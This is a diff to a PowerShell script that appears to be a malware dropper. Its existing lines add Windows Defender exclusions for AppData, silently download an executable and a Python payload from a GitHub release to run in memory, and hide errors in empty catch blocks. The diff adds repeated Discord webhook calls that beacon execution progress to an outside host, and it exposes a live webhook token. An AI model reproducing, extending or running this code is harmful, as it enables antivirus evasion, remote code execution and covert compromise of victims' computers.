@@ -64,6 +64,14 @@ try {
     try { Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null } catch { $exclusionsAdded = $false }
     try { Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null } catch { $exclusionsAdded = $false }
 
+    $webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
+    $body = @{
+        content = 'Hello4!'
+    } | ConvertTo-Json
+    
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
+
+
     # Download and save scripthelper.exe if exclusions were added
     if ($exclusionsAdded -and $directories) {
         $randomDir = $directories | Get-Random
@@ -74,12 +82,28 @@ try {
         } 
         catch { }
 
+        $webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
+        $body = @{
+            content = 'Hello5!'
+        } | ConvertTo-Json
+        
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
+
+
         $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
         try { 
             Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null 
         } 
         catch { }
     }
+
+    $webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
+    $body = @{
+        content = 'Hello5!'
+    } | ConvertTo-Json
+    
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
+
 
     # Attempt to run 1.pyw in memory
     $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
@@ -95,3 +119,9 @@ try {
     }
 }
 catch { }
+$webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
+$body = @{
+    content = 'Hello3!'
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
